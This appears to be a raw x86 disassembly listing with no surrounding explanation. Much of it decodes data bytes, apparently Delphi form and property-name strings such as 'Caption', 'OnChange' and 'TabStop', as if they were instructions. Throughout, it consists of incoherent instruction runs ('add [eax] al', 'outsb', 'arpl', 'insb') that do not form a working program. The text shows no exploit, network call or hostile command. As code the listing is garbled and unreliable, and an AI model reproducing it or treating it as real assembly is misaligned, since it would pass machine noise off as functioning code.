or [ edi + 0x1b00046 ] cl
add [ eax ] al
or eax [ esi + 0x42 ]
jbe r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
add [ eax ] dl
inc eax
add al ch
add [ eax ] eax
add [ eax ] cl
inc esi
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
add [ eax ] eax
add [ edi ] cl
inc esi
push ebp
jae r-xdata
outsd
insb
jae r-xdata
add ah bl
pop edx
inc edx
add al bl
add [ eax ] eax
add [ eax ] cl
inc esi
push esp
popad
bound ecx [ ecx + ebp * 2 + 0x73 ]
je r-xdata
jae r-xdata
insb
dec edi
jne r-xdata
dec edi
outsb
dec ebx
jns r-xdata
jb r-xdata
inc ebx
push 0x65676e61
add al [ fs : eax ]
je r-xdata
add [ eax ] dl
inc eax
add cl ch
add [ eax ] eax
add [ esi ] al
inc esi
inc ebx
je r-xdata
add [ eax ] al
inc esi
push eax
jb r-xdata
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
fcomp [ edx + 0x42 ]
add al ah
add [ eax ] eax
add [ esi + eax * 2 ] cl
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
jae r-xdata
add [ eax ] al
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x27374
add [ eax + edx * 4 ] dl
inc esi
add al cl
add [ eax ] eax
add [ esi + eax * 2 ] cl
add al [ eax ]
add ah bl
pop edx
inc edx
add ah al
add [ eax ] eax
add [ esi + eax * 2 ] cl
les eax [ ecx ]
add [ eax ] al
jb r-xdata
in al 0x90
jb r-xdata
aam 0x46
add [ eax ] al
add al [ eax ]
add [ eax ] dl
inc esi
add [ eax ] ah
add al [ eax ]
add [ ebx ] cl
inc esi
jo r-xdata
dec edi
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
xor eax [ edx + eax ]
add [ eax ] al
adc [ eax ] al
out dx al
add [ eax ] eax
add [ 0x72615046 ] dl
outsb
popad
jb r-xdata
xor eax [ edx + eax ]
add [ eax ] al
adc [ eax ] al
0x8000001 0x5346
js r-xdata
outsd
jb r-xdata
add [ eax ] dl
inc eax
add ah ch
add [ eax ] eax
add [ ecx ] cl
inc esi
add [ eax ] al
pushfd
adc [ eax ] al
in al 0x1
add [ eax ] al
or [ esi + 0x54 ] eax
popad
bound ecx [ edi + 0x72 ]
jb r-xdata
add [ eax ] al
mov ah 0x8f
inc esi
add [ ecx + 0xa000001 ] dh
inc esi
inc edx
add [ eax ] al
scasb [ edi ]
inc eax
add [ eax + 0x2 ] bl
outsd
outsb
add al [ eax ]
add [ eax ] al
adc [ eax ] al
dec eax
add al [ eax ]
add [ esi ] cl
jae r-xdata
add [ eax ] cl
inc esi
dec edi
outsb
dec ebx
jns r-xdata
jb r-xdata
cwde
inc esi
add al bh
add [ eax ] eax
add [ ebx ] cl
inc esi
imul eax [ edx + esi * 2 + 0x6f ] 0x70
add al [ eax ]
add [ eax - 0x7ffb999 ] bl
outsd
jne r-xdata
inc edx
add [ eax ] al
add al [ eax ]
add [ eax ] cl
inc esi
dec edi
add ah dl
inc esi
je r-xdata
outsb
dec edi
je r-xdata
adc [ edx ] al
add [ eax ] al
push cs
add al bh
inc si
add al dh
add [ eax ] eax
add [ ebx ] cl
inc esi
dec edi
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
imul ebp [ esi + 0x67 ] 0x776f6853
imul ebp [ esi + 0x67 ] 0x6e616843
add al [ fs : bx + si ]
add [ ebp ] cl
popad
outsb
arpl [ ebp + 0x2 ] sp
add [ ecx ] al
add [ eax ] dl
inc eax
add [ eax + 0x2 ] ah
add [ eax ] al
cmovbe eax [ edi + ebp * 2 + 0x75 ]
bound ebp [ ebp + 0x42 ]
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx * 2 + 0x6e ] si
jae r-xdata
dec ecx
outsb
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x274
fadd [ esi + eax * 2 + 0x24c00 ]
add [ 0x756f4d46 ] cl
jae r-xdata
outsd
jne r-xdata
add al [ eax ]
add [ eax + 0x28004663 ] dl
add al [ eax ]
inc esi
dec ebp
add [ eax ] dl
inc eax
add [ eax + 0x2 ] cl
add [ eax ] al
push cs
jo r-xdata
aam 0x46
inc edx
add [ eax ] cl
add al [ eax ]
add [ edi ] al
inc esi
dec edi
outsb
inc ebp
add [ eax ] al
insb
inc edx
jne r-xdata
add [ edx + eax ] dl
inc edx
outsw
jb r-xdata
inc esi
dec edi
outsb
inc edi
je r-xdata
mov al 0x69
inc esi
add [ eax ] dl
add al [ eax ]
add [ esi ] cl
add [ eax ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x2 ] bp
or [ esi + 0x4f ] eax
imul esi [ ebp + 0x49 ] 0x26f666e
add [ eax ] al
nop
arpl [ esi ] ax
sbb [ edx ] al
add [ eax ] al
or al [ esi + 0x4f ]
outsb
dec ebx
jns r-xdata
dec [ ebx * 4 + 0x520046 ]
jb r-xdata
add al [ eax ]
add [ eax ] eax
adc [ eax ] al
pushad
add al [ eax ]
add [ edi ] cl
inc esi
inc esp
outsd
jne r-xdata
inc ebx
outsd
outsb
je r-xdata
sub [ eax + 0x46 ] 0x0
xor [ edx ] al
add [ eax ] al
add [ eax ] al
outsb
inc ebp
outsb
jb r-xdata
add al [ eax ]
add [ ebx ] cl
inc esi
inc esp
jae r-xdata
add [ eax ] al
pop es
inc esi
dec eax
popad
outsb
insb
add al [ gs : eax ]
add ah ah
adc [ eax ] al
pop esp
add al [ eax ]
add [ edi ] cl
inc esi
dec edi
arpl [ edx ] ax
add [ eax ] al
fsubr [ esi + 0x2580040 ]
jb r-xdata
inc esi
add [ eax + 0x2 ] al
add [ eax ] al
adc [ esi + 0x4f ] al
add al [ eax ]
add ah ah
nop
add [ eax ] al
dec esp
nop
inc esi
add [ eax ] bh
add al [ eax ]
add [ esi + eax * 2 ] dl
dec edi
outsb
inc ecx
insb
imul esp [ edi + 0x6e ] 0x65736e49
jb r-xdata
outsd
ja r-xdata
mov dh 0xff
xor al 0x9d
inc esi
add [ edx ] al
hlt
inc esi
add [ edx ] dl
add al [ fs : eax ]
add [ eax ] eax
adc [ eax ] al
popad
add al [ eax ]
add [ ecx ] dl
inc esi
dec ecx
jne r-xdata
insb
inc edx
outsd
insb
add al [ eax ]
add al bl
test [ esi ] al
push eax
add al [ eax ]
add [ 0x756f5446 ] cl
arpl [ eax + 0x43 ] bp
outsd
outsb
je r-xdata
je r-xdata
add al [ fs : eax ]
add [ eax ] al
adc [ eax ] al
out dx eax
add [ eax ] eax
add [ ecx ] bl
add ah dh
call ebp
sahf
inc esi
add [ edx ] al
hlt
outsb
push ebx
imul edi [ edx + 0x65 ] 0x2
and al [ eax ]
out 0x9b al
inc esi
add [ eax + eax + 0xb ] cl
add [ esp + ebx * 4 ] bl
inc esi
add [ eax + eax - 0xc ] al
jmp [ eax - 0x64 ]
outsb
dec ecx
add [ ebx ] cl
inc esi
inc esp
push di
outsb
push eax
jb r-xdata
insb
add al [ eax ]
add ah ah
adc [ eax ] al
push esp
add al [ eax ]
outsb
inc ecx
insb
imul esp [ edi + 0x6e ] 0x69736f50
je r-xdata
inc edx
add ah dh
[ esi + ebx * 4 + 0x46 ]
add [ edx ] dl
mov ch 0xff
stosb [ edi ]
sahf
inc esi
add [ edx ] al
hlt
jae r-xdata
insd
inc ebx
outsd
insd
jo r-xdata
outsd
xor [ esi + r-xdata ] bl
je r-xdata
hlt
inc esi
add [ edx ] al
outsd
outsb
add al [ eax ]
add [ eax + 0x640040a8 ] eax
sub_46abd3
push cs
push ebx
push 0x646c756f
dec eax
imul esp [ ebp + 0x48 ] 0x3746e69
add [ eax ] al
adc [ eax ] al
or [ eax ] al
add [ eax ] eax
in al dx
lodsb [ esi ]
inc esi
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
sub eax 0x47be4400
add [ 0x656c6552 ] cl
popad
jae r-xdata
imul ebp [ esi + 0x74 ] 0xe4000002
adc [ eax ] al
or [ eax ] al
add eax 0x74614441
dec eax
popad
outsb
insb
add eax [ gs : eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] eax
in al dx
lodsb [ esi ]
inc esi
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
pop esp
add [ eax + 0x100047c1 ] dh
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ edx ] eax
add [ edx ] al
add [ eax + r-xdata ] dl
pop es
or edx [ eax + ecx * 2 + 0x69 ]
outsb
je r-xdata
arpl [ gs : ebx + eax ] si
int3
add [ eax ] dl
add [ 0x46acec00 ] al
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + edx + 0x10040 ] bl
or [ ebp + 0x61 ] cl
js r-xdata
dec eax
imul ebp [ esi + 0x74 ] 0x61746144
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or al 0x0
add al 0x0
in al dx
lodsb [ esi ]
inc esi
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add ah cl
test al 0x40
add [ ecx ] al
add [ edx + edx * 2 ] al
arpl [ gs : edx + eax ] si
add [ eax + 0x12 ] al
inc eax
add [ edx ] al
add [ 0x6e694841 ] al
je r-xdata
add [ eax + 0x4208ffff ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x7465646f
inc edx
inc esi
add [ eax + 0xe ] dl
inc edi
add [ eax - 0xfffb8f2 ] cl
cmp [ edi ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
imul ebp [ esi + 0x64 ] 0xa978776f
inc esi
add al dh
test al 0x46
add [ edi ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ 0xffffffffad390200 ] al
inc esi
add [ edx ] al
add [ edx ] al
pop esp
lodsd [ esi ]
inc esi
add [ edx ] al
add [ edx ] al
jle r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x40000002
adc al [ eax ]
add al [ eax ]
add eax 0x6e694841
je r-xdata
popad
add al [ eax ]
add al [ eax ]
add al bl
rol [ edi ] 0xc
inc ebx
popad
insb
arpl [ eax + 0x69 ] cx
outsb
je r-xdata
in al 0x10
inc eax
add [ eax ] cl
add [ 0x74614441 ] al
add [ eax ] al
inc esp
add [ eax + eax ] ch
outsd
insb
jae r-xdata
inc eax
add [ eax + eax ] cl
add eax 0x74614441
popad
add al [ eax ]
inc eax
int3
inc esi
add [ edx ] al
add [ edx ] al
sahf
lodsd [ esi ]
inc esi
add [ edx ] al
add [ edx ] al
mov edi 0x20046ad
add [ edx ] al
add [ eax + 0x45 ] dh
inc edx
add [ ecx ] ah
add bh bh
add [ eax ] 0x0
in al 0x10
add [ eax ] al
sub_46adb7
inc [ esi ]
inc ebx
popad
outsb
jbe r-xdata
add al ah
rol [ ebx ] 0xd8
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add al ah
mov cl [ eax ]
je r-xdata
jae r-xdata
inc esi
dec eax
add ah bh
movsd [ edi ] [ esi ]
dec eax
add ah ah
lahf
dec eax
add [ esi + eax * 8 - 0x3ad3ffbd ] al
inc ebx
add [ esi + eax * 8 - 0x3617ffbd ] dl
inc ebx
add [ eax ] bl
int 0x43
add [ esi + eax * 8 - 0x3963ffbd ] ah
inc ebx
add [ eax ] ah
int 0x43
add [ eax - 0x76 ] al
dec eax
add ah bh

add [ eax ] al
add [ eax ] al
pop ebx
scasd [ edi ]
jno r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307ffff ] al
popad
jo r-xdata
inc esi
add [ eax + eax + 0x77680000 ] dl
dec eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0xfffbfa8 ] bh
sar [ eax ] 0xae
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
add [ eax ] al
push 0xac004877
push esi
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
add al dh
outsd
outsb
je r-xdata
add [ eax + eax ] ah
dec [ edi + ecx + 0x47 ]
add [ edi + ecx + 0x47 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604ffff ] al
add [ eax - 0x7fffb94f ] dl
scasb [ edi ]
inc esi
add [ edi ] cl
scasd [ edi ]
inc esi
add [ eax ] al
add [ eax ] al
add [ ebx - 0x51 ] bl
imul ebp [ edi + 0x6e ] sub_446758
insb
add [ eax ] al
sub_46ae72
inc edi
add [ eax + 0x680048aa ] bh
stosd [ edi ]
dec eax
add [ ebx + eax * 8 + 0x47 ] dl
add [ eax ] al
add [ eax ] al
push es
add [ eax ] al
shl [ edi ] 0x1
inc esi
add [ eax ] bh
add [ eax ] al
or eax [ esi + 0x44 ]
jb r-xdata
add al [ eax ]
add al dl
daa
inc ebx
jne r-xdata
add [ eax ] dl
inc eax
add [ eax + eax ] cl
jae r-xdata
jb r-xdata
jae r-xdata
add al 0x0
add [ eax ] al
adc [ eax ] al
or al 0x0
add [ ecx ] cl
add [ edx - 0x51 ] ch
inc esi
add [ edx ] al
hlt
add [ eax ] al
outsd
jb r-xdata
add [ eax ] dl
inc eax
add [ edx ] bh
add [ eax ] al
or [ esi + 0x44 ] eax
jb r-xdata
add [ eax ] al
imul ebp [ bp + 0x67 ] 0xdc000002
scasb [ edi ]
inc eax
add [ eax + eax ] bh
add [ ebx ] cl
inc esi
inc esp
jb r-xdata
or eax 0x420046b0
add ah dh
dec [ ebx - 0x50 ]
inc esi
add [ edx ] al
hlt
dec eax
popad
outsb
insb
add al [ gs : eax ]
add [ eax - 0x7fffbf58 ] al
add [ eax ] al
add [ esi + eax * 2 ] cl
inc esp
jb r-xdata
[ eax + esi * 4 + r-xdata ]
adc [ eax ] eax
shl [ eax + r-xdata ] 0x1
hlt
dec eax
outsd
je r-xdata
hlt
jo r-xdata
inc edx
add ah dh
je r-xdata
pushfd
adc [ eax ] al
mov [ eax ] al
add [ eax ] al
or al [ esi + 0x44 ]
jb r-xdata
add [ eax ] al
[ ebp - 0x4f ]
inc esi
add [ edx ] al
hlt
dec ecx
outsb
js r-xdata
inc esi
add [ eax + eax + 0x460a0000 ] cl
dec edi
insb
inc ebx
jne r-xdata
shl [ edi ] 0x1
add [ eax ] al
sub_46b232
dec [ eax ]
inc esp
jb r-xdata
cld
movsd [ edi ] [ esi ]
dec eax
add ah ah
lahf
dec eax
add [ esi + eax * 8 - 0x3ad3ffbd ] al
inc ebx
add [ esi + eax * 8 - 0x3617ffbd ] dl
inc ebx
add [ eax ] bl
int 0x43
add [ esi + eax * 8 - 0x3963ffbd ] ah
inc ebx
add [ eax ] ah
int 0x43
add [ eax - 0x76 ] al
dec eax
add ah bh

imul ebp [ bp + 0x67 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
mov dl 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
mov dl 0x46
add [ eax + eax - 0x52200000 ] dl
inc esi
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0xfffbfa8 ] bh
int3
sub_46b2fd
mov cl 0x46
add [ 0x6f430800 ] cl
outsb
je r-xdata
jo r-xdata
outsd
insb
jae r-xdata
add bh bh
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1fffffff ] al
add eax [ eax ]
or al [ edx + 0x6c ]
outsb
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax + 0x67 ] bl
inc esp
add [ eax + eax ] cl
dec [ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
[ edi ]
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
or al [ ebx + 0x6f ]
insb
outsd
jb r-xdata
add [ eax ] al
add [ edx ] al
add [ edx ] cl
inc ebx
outsd
inc esp
add al bl
xchg edi eax
dec eax
add [ edi + edx * 4 + 0x48 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
[ edi ]
add al 0x0
pop es
inc edx
imul eax [ ebx + 0x6f ] 0x6c
outsd
jb r-xdata
add [ esi ] al
dec eax
imul esp [ gs : edi + 0x68 ] 0x4875b474
add [ edi ] al
add bh bh
inc edi
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or [ ecx + 0x6d ] ecx
popad
push esp
jns r-xdata
jo r-xdata
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
adc [ eax ] al
cmp al 0x0
add bh bh
cmp al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x4 ] al
add eax 0x6c410700
insb
outsd
arpl [ edx + 0x79 ] ax
cld
jbe r-xdata
add [ eax ] al
jmp [ ecx * 4 + 0x10048 ]
add [ gs : eax ] dl
inc eax
add [ ebp ] al
add bh bh
inc ebp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] eax
push es
dec ebp
popad
inc [ ebp ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
push r-xdata
inc esp
add [ eax ] al
push [ eax - 0x5f ]
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
push es
add [ esp + eax * 2 ] cl
jb r-xdata
pushfd
adc [ eax ] al
xor al 0x0
add bh bh
pushad
lea ecx [ eax ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x10 ] al
pop es
add [ eax ] dh
or eax [ eax ]
add ecx [ 0x20046b3 ]
aam 0x46
inc edx
add [ eax ] ch
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
ja r-xdata
or eax [ eax ]
or edx [ ebx + 0x68 ]
popad
jb r-xdata
add [ eax ] 0x0
add [ eax ] al
inc esi
add [ edx ] al
add [ ebx ] al
fwait
mov bl 0x46
add [ edx ] al
add [ ebx ] al
retn 0x46b3
add al [ eax ]
add ecx [ ebx - 0x4c ]
inc esi
add [ edx ] al
add [ ebx ] al
jno r-xdata
dec ecx
insd
popad
jae r-xdata
jae r-xdata
outsb
push ebx
je r-xdata
add [ ebx ] al
xor dh [ ebx + 0x20046 ]
add edx [ ebx + esi * 4 + 0x46 ]
add [ edx ] al
add [ ebx ] al
jbe r-xdata
push 0xd03000b
mov bl 0x46
add [ edx ] al
inc esi
add [ edx ] al
add [ edx ] al
add [ ebx + 0x46b53cc0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
mov bh 0x46
add [ esi * 4 - 0x49f1ffba ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ edx - 0x4a ] dl
inc esi
add [ eax + eax ] ch
add [ eax ] al
cmp al 0x14
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add al ah
push ebp
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
fadd [ esi + eax * 2 + 0x400 ]
add [ 0x69684346 ] cl
insb
inc ebx
outsd
outsb
je r-xdata
adc [ eax ] al
cmp [ eax ] al
add bh bh
and al 0x8d
dec eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] 0x0
add [ eax ] al
or al 0x0
add eax 0x74646957
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsb
inc ebx
push 0x65676e61
add [ eax ] dl
inc eax
add [ esi ] al
add bh bh
sbb [ ebp + 0x10048 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
imul esp [ edx + 0x6c ] 0x2676e69
add [ eax ] al
clc
mov ebp 0x1c0046
add [ eax ] al
add eax 0x65725446
add al [ gs : eax ]
add [ eax + edx + 0x200040 ] bl
add [ eax ] al
or al [ esi + 0x5a ]
outsd
outsb
dec esp
imul ebp [ ebp + 0x69 ] 0x274
outsd
insb
add al [ eax ]
add ah bl
mov bh 0x46
add [ eax ] cl
add [ eax ] al
add [ ebx ] cl
inc esi
inc ebx
push 0x5a646c69
outsd
outsb
jae r-xdata
fdiv [ edi + 0xc0046 ]
add [ eax ] al
or al 0x46
dec esi
js r-xdata
add [ eax ] al
je r-xdata
push ebx
imul esp [ edx + 0x6c ] 0x2676e69
add [ eax ] al
jo r-xdata
pushfd
adc [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax + eax ] ah
inc esi
add [ eax ] dl
add [ eax ] al
add [ esi + eax * 2 ] cl
dec edi
jb r-xdata
or [ esi + 0x4f ] al
insb
push ebx
outsb
je r-xdata
and al 0x0
je r-xdata
imul edi [ edx + 0x65 ] 0x2
outsd
outsb
add al [ eax ]
add ah bl
mov bh 0x46
add [ eax + eax ] dl
add [ eax ] al
or eax [ esi + 0x50 ]
popad
jb r-xdata
hlt
outsb
je r-xdata
or [ eax ] al
pop esp
mov dh 0x46
add [ eax + eax - 0xc ] al
call [ eax + 0x420046b6 ]
outsd
outsb
add al [ gs : eax ]
add ah bl
mov bh 0x46
add [ eax ] bl
add [ eax ] al
add [ esi + eax * 2 ] cl
push eax
jb r-xdata
inc edx
add ah dh
[ 0x420046b7 ]
jbe r-xdata
add ah dh
call ecx
mov dh 0x46
add [ edx ] al
hlt
inc edx
sub_46bafa
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
add [ eax + 0x34004058 ] dh
popfd
inc eax
add [ eax - 0x63 ] al
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x63 ] dl
inc eax
add [ ebp + edx * 2 - 0x30c7ffc0 ] ah
inc edi
add [ eax + 0x2c0047cf ] dl
hlt
sub_46c61c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ fs : esi ] r-xdata
jle r-xdata
bound ebp [ eax + 0x73 ]
push ebx
je r-xdata
inc esi
add bl dh
mov [ esi ] r-xdata
cmp eax ecx
inc esi
add [ edx + eax - 0x58fc0000 ] dl
inc esi
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0xfffbfa8 ] bh
fcomp [ eax + 0x40 ]
add [ edi + ebp * 2 + 0x47 ] dh
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add ah ch
lds eax [ edi ]
mov [ ecx + 0x5e880047 ] ch
outsb
popad
jb r-xdata
inc edi
add ah cl
adc al [ ebx ]
nop
cmp [ edi ] eax
in al 0x58
inc edi
mov [ ebp + 0x40 ] dl
add [ ebp + edx * 2 - 0x3a13ffc0 ] ah
inc edi
add [ eax - 0x77ffb857 ] cl
pop esi
or ah [ edx + 0x68 ]
jae r-xdata
int3
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
add al dh
popad
insb
insb
outsd
outsd
outsb
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax ] dh
inc ebp
inc edi
add [ eax ] bh
or al 0x47
add [ eax ] bl
int 0x43
add [ esi + eax * 8 - 0x3963ffbd ] ah
inc ebx
add [ eax ] ah
int 0x43
add ah dl
push es
dec eax
add ah bh

outsd
insb
jae r-xdata
shl [ eax - 0x3a ] 0x46
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + eax * 8 + 0x46 ] ah
add [ eax - 0x37 ] dl
inc esi
add [ esi - 0x39 ] bh
add [ ebx + 0x46c670c0 ] cl
sub_46c652
inc ebx
add al dl
pop eax
inc eax
add al ah
rol [ ebx ] 0xd8
pop eax
inc eax
add [ edi + ebp * 2 + 0x47 ] dh
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add ah ch
lds eax [ edi ]
mov [ ecx + 0x5e880047 ] ch
inc edi
add ah cl
adc al [ ebx ]
nop
cmp [ edi ] eax
in al 0x58
inc edi
add [ eax ] dh
inc ebp
inc edi
add [ eax ] bh
or al 0x47
add [ eax ] bl
int 0x43
add [ esi + eax * 8 - 0x3963ffbd ] ah
inc ebx
add [ eax ] ah
int 0x43
add ah dl
push es
dec eax
add ah bh

sub_46c6a2
inc ebx
add [ ebx - 0x5647ffb9 ] ch
inc edi
add [ ecx + ebp * 4 ] al
inc edi
add al al
inc edi
add ah ah
pop ss
inc edi
add al ch
pop ss
inc edi
add ah al
std
inc esi
add [ eax ] ch
sahf
inc edi
add [ eax - 0x62 ] cl
inc edi
add [ eax - 0x66 ] ah
inc edi
add [ eax ] cl
std
inc esi
add [ ebx + edi + 0x47 ] ah
add [ eax - 0x6bffb8c5 ] dl
add [ edi ] 0x20
or al 0x47
add [ eax - 0x57ffb901 ] ah
or eax 0xbb080047
inc edi
add [ eax + edx + 0x47 ] dl
add ah ch
push cs
inc edi
add ah ah
imul eax [ edi ] sub_46fd04
adc al 0x3c
inc edi
add [ edx + ebx * 4 - 0x6437ffb9 ] dh
inc edi
add [ eax ] ah
xchg ebp eax
inc edi
add [ ebx + ebx * 4 + 0x45a80047 ] ch
inc edi
add [ ecx + edx * 2 ] al
inc edi
add [ eax ] ah
pushad
inc edi
add [ eax + 0x7 ] bl
dec eax
add al al
pop esp
inc edi
add [ edi + eax + 0x48 ] dh
add [ eax - 0x23ffb8a0 ] bh
pushad
inc edi
add [ eax + 0x61 ] dh
inc edi
add [ edi + ebx * 2 + 0x47 ] bl
add ah dh
pop esi
inc edi
add ah al
mov ecx 0x9cf40047
inc edi
add [ esi + eax * 8 ] bh
inc edi
add [ ecx + edi * 4 ] bh
inc edi
add [ eax + 0xc004764 ] dh
cdq
inc edi
add [ edx + edi * 4 - 0x63a3ffb9 ] cl
inc edi
add ah ah
pop es
dec eax
add ah cl
pop es
dec eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x12 ] al
inc eax
add [ eax + 0x40000002 ] al
adc al [ eax ]
test [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax 0xd11c0000
inc esi
add [ eax + 0x2 ] bh
add [ eax ] al
or eax [ esi + 0x48 ]
imul ebp [ esi + 0x74 ] 0x65726150
outsb
je r-xdata
add [ eax ] dl
inc eax
add [ edx + eax ] bh
add [ ecx ] cl
inc esi
push eax
outsd
jo r-xdata
add [ eax ] al
outsb
js r-xdata
bound ebp [ edi + 0x76 ]
add al [ gs : eax ]
add [ eax + 0x12 ] al
inc eax
add [ eax + 0x6000002 ] al
inc esi
push esp
imul esi [ esp + ebp * 2 + 0x65 ] 0x40000002
adc al [ eax ]
test [ edx ] al
add [ eax ] al
or al 0x46
inc esp
jae r-xdata
add [ 0x46c84b00 ] al
add [ eax + eax + 0xb ] cl
add [ ecx + 0x420046c8 ] al
add ah dh
[ ecx + 0x420046c8 ]
add [ eax ] al
or [ eax ] ecx
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
jb r-xdata
imul esi [ ecx + ebp * 2 + 0x6f ] 0x374416e
outsd
je r-xdata
jo r-xdata
add [ eax ] bh
add [ eax ] dl
or [ eax ] cl
or dl [ eax + 0x6f ]
add [ edx ] al
add [ esi + eax + 0x41080048 ] bh
jne r-xdata
add ah dl
or dl [ eax + 0x6f ]
insd
dec eax
imul ebp [ esi + 0x74 ] 0x646e6957
outsd
ja r-xdata
push es
dec eax
add [ esi ] al
inc ebx
jb r-xdata
add ah dl
imul ebp [ edi + 0x6e ] 0xe0000002
jbe r-xdata
je r-xdata
je r-xdata
inc esi
jae r-xdata
outsd
push ebx
imul edi [ edx + 0x65 ] 0x3
add [ eax ] al
or [ eax ] al
add [ eax ] eax
dec esp
leave
inc esi
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
cmp [ eax ] eax
mov ah 0x8
dec eax
add [ edx ] cl
push eax
outsd
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax + 0x10040a8 ] al
add [ 0x6e696f50 ] al
je r-xdata
add eax [ eax ]
add [ eax ] al
popad
je r-xdata
pop es
dec eax
je r-xdata
add esi eax
or [ eax ] cl
clc
or [ eax ] cl
int3
add [ eax + 0xb000002 ] cl
inc esi
dec ecx
insd
popad
dec ecx
add [ edx + eax ] bh
insd
dec eax
imul ebp [ esi + 0x74 ] 0x646e6957
outsd
ja r-xdata
outsd
outsb
inc ecx
je r-xdata
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ ecx + ecx * 8 + 0x46 ] cl
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
dec esp
leave
inc esi
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax ] bl
aad 0x42
add [ edx ] al
add [ esi ] al
inc ecx
dec edi
ja r-xdata
add [ edx ] al
je r-xdata
add [ eax ] dl
push eax
outsd
jae r-xdata
outsd
outsb
